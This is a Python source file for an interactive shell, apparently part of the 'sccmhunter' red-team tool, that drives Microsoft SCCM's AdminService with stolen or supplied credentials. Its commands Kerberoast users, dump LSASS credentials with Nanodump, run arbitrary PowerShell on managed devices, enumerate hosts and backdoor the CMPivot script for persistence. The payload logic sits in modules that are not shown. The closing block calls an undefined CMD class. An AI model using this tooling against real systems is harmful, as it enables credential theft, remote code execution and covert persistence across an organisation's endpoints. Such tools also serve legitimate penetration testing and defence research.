import cmd2
import pandas as dp
import requests
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
from tabulate import tabulate
from lib.scripts.banner import show_banner
from lib.logger import logger
from lib.scripts.runscript import SMSSCRIPTS
from lib.scripts.backdoor import BACKDOOR
from lib.scripts.pivot import CMPIVOT
from lib.attacks.admin import QUERYDB, DATABASE

import os
import sqlite3


# #add debugging

class SHELL(cmd2.Cmd):

    def __init__(self, username, password, target, logs_dir):
        super().__init__(allow_cli_args=False)
        self.username = username
        self.password = password
        self.target = target
        self.logs_dir = logs_dir
        self.headers = {'Content-Type': 'application/json; odata=verbose'} # add useragent? currently shows python useragent in logs
        self.intro = logger.info('[!] Press help for extra shell commands')
        self.device = ""
        self.cwd = "C:\\"
        self.prompt = f"({self.device}) {self.cwd} >> "
        self.hostname = ""



    def do_help(self, line):
        print("""
interact (device code)                              Target Device Code to Query

--POCs--
kerberoast (target)                                 Kerberoast target user.
nanodump                                            Extract credentials from LSASS with Nanodump
script (/path/to/script)                            Run provided PowerShell script on target.
              

--Situational Awareness--           
administrators                                      Query local administrators on target
cat                                                 Return file contents of specified file in the path.
cd                                                  Change current working directory.
console_users                                       Show total time any users has logged on to the target.
disk                                                Show disk information on the target.
environment                                         Show configured environment variables on target.
ipconfig                                            Run ipconfig on target
list_disk                                           Show drives mounted to the target system.
ls                                                  List files in current working directory.
osinfo                                              Show OS info of target system.
ps                                                  List running processes on target.
services                                            List running services on target.
sessions                                            Show users with an active session on the target system.
shares                                              List file shares hosted on target.
software                                            Show installed software on the target system.
              
--Database Commands--
get user [username]                                 Get information about a specific user.
get device [machinename]                            Get information about a specific device.
get puser [username]                                Show where target user is a primary user. (If configured.)
get application [*] or [CI_ID]                      Show all applications or detailed information about a single application.                             
get collection [*] or [Name]                        Show all collections or detailed information about a single collection.
get deployment [*] or [AssignmentName]              Show all deployments or detailed information about a single deployment.
get lastlogon [username]                            Show where target user last logged in.

--Post Ex--
backdoor                                            Backdoor CMPivot Script
backup                                              Backup original CMPivot Script
restore                                             Restore original CMPivot Script



exit                                                Exit the console.
! (command)                                         Local shell command.
              
    """)

# ############
# cmd2 Settings
# ############

    def postcmd(self, stop, arg):
        self.prompt = f"({self.device}) ({self.cwd}) >> "
        return stop
    
    def check_device(self, device_id):
        _dbname = f"{self.logs_dir}/db/sccmhunter.db"
        conn = sqlite3.connect(_dbname, check_same_thread=False)

    def do_interact(self, arg):
        option = arg.split(' ')
        self.device = option[0]

    def emptyline(self):
        pass

    def do_exit(self, arg):
        return True 
    
    def do_cd(self, arg):
        #path needs to end with \ or all file system queries will fail
        if not arg.endswith("\\"): 
            arg = arg + "\\"
        option = arg.split(' ')
        self.cwd = option[0]


# ############
# Database Section
# ############

    def do_get(self, arg):
        if os.path.getsize(f"{self.logs_dir}/db/sccmhunter.db") > 1:
            db = QUERYDB(self.logs_dir)
            db.do_get(arg=arg)
        else:
            logger.info("[-] Database file not found. Would you like to collect Database data?")
            answer = input("Y/N: ")
            if answer.lower() == "y":
                build_db = DATABASE(self.username, self.password, f"https://{self.target}/AdminService/wmi", self.logs_dir)
                db_ready = build_db.run()
            else:
                return


# ############
# PowerShell Script Section
# All modules will call and execute script from the lib.scripts directory
# ############

    # Kerberoast a single user
    def do_kerberoast(self, arg):
        option = arg.split(' ')
        roastable = option[0]
        roastem = SMSSCRIPTS(username=self.username, 
                             password=self.password,
                            target = self.target,
                            device = self.device,
                            logs_dir = self.logs_dir,
                            optional="kerberoast", 
                            optional_target=roastable)
        roastem.kerberoast()

    def do_nanodump(self, arg):
        dumpem = SMSSCRIPTS(username=self.username,
                    password=self.password,
                    target = self.target,
                    device = self.device,
                    logs_dir = self.logs_dir,
                    optional="nanodump")
        dumpem.run()
        
    def do_cat(self, arg):
        option = arg.split(' ')
        filename = option[0]
        logger.info(f"Tasked SCCM to show {arg}")
        fullpath = self.cwd + filename
        type = SMSSCRIPTS(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir,)
        type.cat(fullpath)
    
    def do_script(self, arg):
        option = arg.split(' ')
        scriptpath = option[0]
        script = SMSSCRIPTS(username=self.username, 
                            password=self.password,
                            target = self.target,
                            device = self.device,
                            logs_dir = self.logs_dir,
                            optional="custom", 
                            optional_target=scriptpath)
        script.run()



# ############
# CMPivot Backdoor Section
# Backdoor existing CMPivot script with your own
# ############

    def do_backdoor(self, arg):
        logger.info("Tasked SCCM to backdoor CMPivot with provided script")
        check = input("IMPORTANT: Did you backup the script first? There is no going back without it. Y/N?")
        if check.lower() == "y":
            option = arg.split(' ')
            scriptpath = option[0]
            backdoor = BACKDOOR(username=self.username, 
                                password=self.password,
                                target = self.target,
                                logs_dir = self.logs_dir,
                                backdoor_script=scriptpath)
            backdoor.run(option="backdoor")

        else:
            return

    def do_restore(self, arg):
        logger.info("Tasked SCCM to restore the original CMPivot script.")
        option = arg.split(' ')
        backdoor = BACKDOOR(username=self.username, 
                            password=self.password,
                            target = self.target,
                            logs_dir = self.logs_dir,
                            backdoor_script=None)
        backdoor.run(option="restore")

    def do_backup(self, arg):
        logger.info("Tasked SCCM to backup the CMPivot script.")
        option = arg.split(' ')
        backdoor = BACKDOOR(username=self.username, 
                            password=self.password,
                            target = self.target,
                            logs_dir = self.logs_dir,
                            backdoor_script="")
        backdoor.run(option="backup")

# ############
# CMPivot Section
# All modules will call built-in CMPivot queries
# ############

    

    def do_administrators(self, arg):
        logger.info("Tasked SCCM to run Administrators.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.administrators()
    
    def do_ipconfig(self, arg):
        logger.info("Tasked SCCM to run IPCONFIG.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.ipconfig()

    def do_shares(self, arg):
        logger.info("Tasked SCCM to list file shares.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.file_share()

    def do_services(self, arg):
        logger.info("Tasked SCCM to list services.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.services()
    
    def do_ps(self, arg):
        logger.info("Tasked SCCM to list processes.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.process()

    def do_console_users(self, arg):
        logger.info("Tasked SCCM to show all users that have signed in.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.system_console_user()

    def do_ls(self, arg):
        logger.info(f"Tasked SCCM to list files in {self.cwd}.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.file(self.cwd + "*")

    def do_list_disk(self, arg):
        logger.info(f"Tasked SCCM to show mounted drives on {self.device}.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.logical_disk()

    def do_software(self, arg):
        logger.info(f"Tasked SCCM to list software installed {self.device}.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.installed_software()   

    def do_sessions(self, arg):
        logger.info(f"Tasked SCCM to show users currently signed in to {self.device}.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.user()   

    def do_osinfo(self, arg):
        logger.info(f"Tasked SCCM to show system info of {self.device}.")
        pivot = CMPIVOT(username=self.username,
                        password=self.password,
                        target = self.target,
                        device = self.device,
                        logs_dir = self.logs_dir)
        pivot.osinfo()

    def do_environment(self, arg):
        logger.info(f"Tasked SCCM to show Environment variables of {self.device}.")
        pivot = CMPIVOT(username=self.username,
                password=self.password,
                target = self.target,
                device = self.device,
                logs_dir = self.logs_dir)
        pivot.environment()

    def do_disk(self, arg):
        logger.info(f"Tasked SCCM to show disk information of {self.device}.")
        pivot = CMPIVOT(username=self.username,
                password=self.password,
                target = self.target,
                device = self.device,
                logs_dir = self.logs_dir)
        pivot.disk()

class CONSOLE:
    def __init__(self, username=None, password=None, ip=None, debug=False, logs_dir=None):
        self.username = username
        self.password = password
        self.url = ip
        self.debug = debug
        self.logs_dir = logs_dir
    
    def run(self):
        try:
            endpoint = f"https://{self.url}/AdminService/wmi/"
            r = requests.request("GET",
                                endpoint,
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False)
            if r.status_code == 200:
                self.cli()
            if r.status_code == 401:
                logger.info("Got error code 401: Access Denied. Check your credentials.")
        except Exception as e:
            logger.info("An unknown error occurred, use -debug to print the response")
            logger.info(e)

    def cli(self):
        cli = SHELL(self.username, self.password, self.url, self.logs_dir)
        cli.cmdloop()

if __name__ == '__main__':
    import sys
    c = CMD()
    sys.exit(c.cmdloop())                                                                                                                                                                                                                            


    
                                                                                                                                                                                                                           
